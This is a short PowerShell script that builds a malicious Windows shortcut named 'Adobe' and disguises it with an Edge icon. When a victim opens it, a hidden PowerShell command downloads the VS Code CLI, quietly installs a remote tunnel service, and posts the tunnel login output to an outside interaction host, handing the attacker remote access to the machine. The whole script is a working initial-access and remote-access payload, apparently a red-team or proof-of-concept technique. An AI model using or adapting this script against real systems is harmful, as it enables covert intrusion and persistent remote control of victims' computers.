#Payload
$EXEPath = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
$post_url = "ckxkmmj2vtc0000m4kwggj634koyyyyyb.oast.fun"
$pay = 'cd C:\tmp; iwr -uri https://az764295.vo.msecnd.net/stable/8b617bd08fd9e3fc94d14adb8d358b56e3f72314/vscode_cli_win32_x64_cli.zip -OutFile vscode.zip; Expand-Archive vscode.zip; cd vscode; .\code.exe tunnel user logout; Start-Sleep 3; Start-Process -FilePath .\code.exe  -ArgumentList "tunnel", "service", "install" -WindowStyle Hidden -RedirectStandardOutput  .\output.txt; Start-Sleep 3; iwr -uri ' + $post_url + ' -Method Post -Body (Get-Content .\output.txt)'
$arguments = " -nop -c $pay"

#lnk file
$LNKName = "Adobe"
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut((Get-Location).Path + "\" + $LNKName + ".lnk")
$link.WindowStyle = '7'
$link.TargetPath = $EXEPath
$link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$link.Arguments = $arguments
$link.Save()
